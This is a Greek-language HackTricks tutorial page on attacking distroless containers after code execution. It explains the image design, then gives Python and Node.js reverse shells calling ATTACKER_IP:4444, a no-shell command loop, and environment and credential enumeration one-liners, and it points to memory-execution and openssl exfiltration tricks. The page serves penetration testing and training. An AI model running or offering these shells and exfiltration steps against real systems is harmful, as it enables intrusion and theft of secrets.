# Distroless Κοντέινερ

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ένα **distroless** container image είναι ένα image που περιέχει τα **ελάχιστα runtime components που απαιτούνται για να τρέξει μια συγκεκριμένη εφαρμογή**, αφαιρώντας σκόπιμα τα συνήθη εργαλεία διανομής όπως package managers, shells και μεγάλα σύνολα γενικών userland utilities. Στην πράξη, τα distroless images συχνά περιέχουν μόνο το binary ή το runtime της εφαρμογής, τις shared libraries του, πακέτα πιστοποιητικών και μια πολύ μικρή διάταξη filesystem.

Το ζήτημα δεν είναι ότι το distroless είναι ένα νέο kernel isolation primitive. Το Distroless είναι μια **στρατηγική σχεδιασμού image**. Αλλάζει τι είναι διαθέσιμο **μέσα** στο filesystem του container, όχι τον τρόπο που ο kernel απομονώνει το container. Αυτή η διάκριση έχει σημασία, γιατί το distroless σκληραίνει το περιβάλλον κυρίως μειώνοντας τι μπορεί να χρησιμοποιήσει ένας επιτιθέμενος μετά από gain code execution. Δεν αντικαθιστά namespaces, seccomp, capabilities, AppArmor, SELinux ή οποιονδήποτε άλλο μηχανισμό runtime isolation.

## Γιατί Υπάρχει το Distroless

Τα distroless images χρησιμοποιούνται κυρίως για να μειώσουν:

- το μέγεθος της εικόνας
- την επιχειρησιακή πολυπλοκότητα της εικόνας
- τον αριθμό πακέτων και binaries που θα μπορούσαν να περιέχουν ευπάθειες
- τον αριθμό εργαλείων post-exploitation που είναι διαθέσιμα σε έναν επιτιθέμενο από προεπιλογή

Γι' αυτό τα distroless images είναι δημοφιλή σε production deployments εφαρμογών. Ένα container που δεν περιέχει shell, package manager και σχεδόν κανένα γενικό εργαλείο είναι συνήθως ευκολότερο στη λειτουργική διαχείριση και δυσκολότερο στην κακόβουλη χρήση μετά από compromise.

Παραδείγματα γνωστών οικογενειών εικόνων στυλ distroless περιλαμβάνουν:

- Google's distroless images
- Chainguard hardened/minimal images

## Τι Δεν Σημαίνει Distroless

Ένα distroless container **δεν** είναι:

- αυτόματα rootless
- αυτόματα non-privileged
- αυτόματα read-only
- αυτόματα προστατευμένο από seccomp, AppArmor, ή SELinux
- αυτόματα ασφαλές από container escape

Είναι ακόμα δυνατό να τρέξετε ένα distroless image με `--privileged`, κοινή χρήση host namespaces, επικίνδυνα bind mounts ή με mounted runtime socket. Σε αυτό το σενάριο, το image μπορεί να είναι minimal, αλλά το container μπορεί να παραμείνει καταστροφικά ανασφαλές. Το Distroless αλλάζει την επιφάνεια επίθεσης του userland, όχι το kernel trust boundary.

## Τυπικά Λειτουργικά Χαρακτηριστικά

Όταν παραβιάζετε ένα distroless container, το πρώτο που συνήθως παρατηρείτε είναι ότι κοινές υποθέσεις σταματούν να ισχύουν. Μπορεί να μην υπάρχει `sh`, `bash`, `ls`, `id`, `cat` και μερικές φορές ούτε siquiera ένα libc-based περιβάλλον που να συμπεριφέρεται όπως το συνηθισμένο tradecraft σας περιμένει. Αυτό επηρεάζει τόσο την επίθεση όσο και την άμυνα, γιατί η έλλειψη εργαλείων καθιστά το debugging, το incident response και το post-exploitation διαφορετικά.

Τα πιο συνηθισμένα μοτίβα είναι:

- ο runtime της εφαρμογής υπάρχει, αλλά σχεδόν τίποτα άλλο
- payloads που βασίζονται σε shell αποτυγχάνουν επειδή δεν υπάρχει shell
- κοινά one-liner enumeration αποτυγχάνουν επειδή λείπουν τα βοηθητικά binaries
- προστασίες στο file system όπως read-only rootfs ή `noexec` σε εγγράψιμες τοποθεσίες tmpfs συχνά επίσης υπάρχουν

Ο συνδυασμός αυτός είναι που συνήθως οδηγεί ανθρώπους να μιλάνε για "weaponizing distroless".

## Distroless και Post-Exploitation

Η κύρια επιθετική πρόκληση σε ένα distroless περιβάλλον δεν είναι πάντα το αρχικό RCE. Συχνά είναι τι ακολουθεί. Αν το exploited workload δίνει code execution σε ένα language runtime όπως Python, Node.js, Java ή Go, μπορεί να μπορείτε να εκτελέσετε αυθαίρετη λογική, αλλά όχι μέσα από τις συνηθισμένες shell-centric ροές εργασίας που είναι κοινές σε άλλα Linux targets.

Αυτό σημαίνει ότι το post-exploitation συχνά στρέφεται σε μία από τις τρεις κατευθύνσεις:

1. **Use the existing language runtime directly** — να χρησιμοποιήσετε απευθείας τον υπάρχοντα runtime της γλώσσας για να εξερευνήσετε το περιβάλλον, να ανοίξετε sockets, να διαβάσετε αρχεία ή να σταδιοποιήσετε επιπλέον payloads.
2. **Bring your own tooling into memory** — αν το filesystem είναι read-only ή εγγράψιμες τοποθεσίες είναι mounted με `noexec`, φορτώνετε τα δικά σας εργαλεία στη μνήμη.
3. **Abuse existing binaries already present in the image** — αν η εφαρμογή ή οι εξαρτήσεις της περιλαμβάνουν κάτι απροσδόκητα χρήσιμο, το εκμεταλλεύεστε.

## Κατάχρηση

### Εντοπισμός του υπάρχοντος runtime

Σε πολλά distroless containers δεν υπάρχει shell, αλλά υπάρχει ακόμα ένας application runtime. Αν ο στόχος είναι μια υπηρεσία Python, το Python υπάρχει. Αν ο στόχος είναι Node.js, το Node υπάρχει. Αυτό συχνά δίνει αρκετή λειτουργικότητα για να εντοπίσετε αρχεία, να διαβάσετε environment variables, να ανοίξετε reverse shells και να σταδιοποιήσετε εκτέλεση στη μνήμη χωρίς ποτέ να καλέσετε το `/bin/sh`.

Ένα απλό παράδειγμα με Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ένα απλό παράδειγμα με Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Επιπτώσεις:

- ανάκτηση μεταβλητών περιβάλλοντος, συχνά συμπεριλαμβανομένων credentials ή service endpoints
- απογραφή συστήματος αρχείων χωρίς `/bin/ls`
- εντοπισμός εγγράψιμων διαδρομών και προσαρτημένων secrets

### Reverse Shell χωρίς `/bin/sh`

Εάν το image δεν περιέχει `sh` ή `bash`, ένα κλασικό reverse shell που βασίζεται σε shell μπορεί να αποτύχει άμεσα. Σε αυτή την περίπτωση, χρησιμοποιήστε το εγκατεστημένο runtime της γλώσσας.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Αν το `/bin/sh` δεν υπάρχει, αντικαταστήστε την τελευταία γραμμή με απευθείας εκτέλεση εντολής μέσω Python ή με έναν βρόχο Python REPL.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Again, if `/bin/sh` is absent, use Node's filesystem, process, and networking APIs directly instead of spawning a shell.

### Πλήρες Παράδειγμα: No-Shell Python Command Loop

Αν το image έχει Python αλλά καθόλου shell, ένας απλός interactive loop είναι συχνά αρκετός για να διατηρήσει πλήρη post-exploitation capability:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Αυτό δεν απαιτεί ένα interactive shell binary. Ο αντίκτυπος είναι ουσιαστικά ο ίδιος με έναν basic shell από την οπτική του attacker: command execution, enumeration και staging περαιτέρω payloads μέσω του υπάρχοντος runtime.

### Εκτέλεση Εργαλείων στη Μνήμη

Distroless images συχνά συνδυάζονται με:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Αυτός ο συνδυασμός κάνει τις κλασικές ροές εργασίας "download binary to disk and run it" αναξιόπιστες. Σε αυτές τις περιπτώσεις, οι memory execution techniques γίνονται η κύρια λύση.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Υπάρχοντα binaries ήδη στην εικόνα

Κάποιες distroless images εξακολουθούν να περιέχουν λειτουργικά απαραίτητα binaries που γίνονται χρήσιμα μετά από compromise. Ένα επανειλημμένα παρατηρούμενο παράδειγμα είναι το `openssl`, επειδή εφαρμογές μερικές φορές το χρειάζονται για crypto- ή TLS-related tasks.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Αν το `openssl` είναι παρόν, μπορεί να χρησιμοποιηθεί για:

- εξερχόμενες συνδέσεις TLS
- data exfiltration μέσω ενός επιτρεπτού egress channel
- staging payload data μέσω encoded/encrypted blobs

Η ακριβής κατάχρηση εξαρτάται από το τι είναι εγκατεστημένο στην πραγματικότητα, αλλά η γενική ιδέα είναι ότι το distroless δεν σημαίνει «καθόλου εργαλεία»· σημαίνει «πολύ λιγότερα εργαλεία απ' ό,τι σε μια κανονική εικόνα διανομής».

## Checks

Ο στόχος αυτών των ελέγχων είναι να καθορίσει αν η εικόνα είναι πραγματικά distroless στην πράξη και ποιες runtime ή helper binaries είναι ακόμα διαθέσιμες για post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Τι είναι ενδιαφέρον εδώ:

- Αν δεν υπάρχει shell αλλά υπάρχει runtime όπως Python ή Node, η post-exploitation πρέπει να μετακινηθεί σε runtime-driven execution.
- Αν το root filesystem είναι read-only και το `/dev/shm` είναι writable αλλά `noexec`, οι τεχνικές memory execution γίνονται πολύ πιο σχετικές.
- Αν βοηθητικά binaries όπως `openssl`, `busybox`, ή `java` υπάρχουν, μπορεί να προσφέρουν αρκετή λειτουργικότητα για να bootstrap περαιτέρω πρόσβαση.

## Προεπιλογές Runtime

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Ελάχιστο userland από σχεδιασμό | No shell, no package manager, only application/runtime dependencies | προσθήκη debugging layers, sidecar shells, αντιγραφή busybox ή tooling |
| Chainguard minimal images | Ελάχιστο userland από σχεδιασμό | Reduced package surface, often focused on one runtime or service | χρήση `:latest-dev` ή debug variants, αντιγραφή εργαλείων κατά το build |
| Kubernetes workloads using distroless images | Εξαρτάται από Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | προσθήκη ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Εξαρτάται από run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Το βασικό σημείο είναι ότι το distroless είναι μια **image property**, όχι μια runtime protection. Η αξία του προέρχεται από τη μείωση του τι είναι διαθέσιμο μέσα στο filesystem μετά από compromise.

## Σχετικές Σελίδες

Για filesystem και memory-execution bypasses που συνήθως χρειάζονται σε distroless περιβάλλοντα:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Για container runtime, socket, και mount abuse που εξακολουθεί να ισχύει για distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
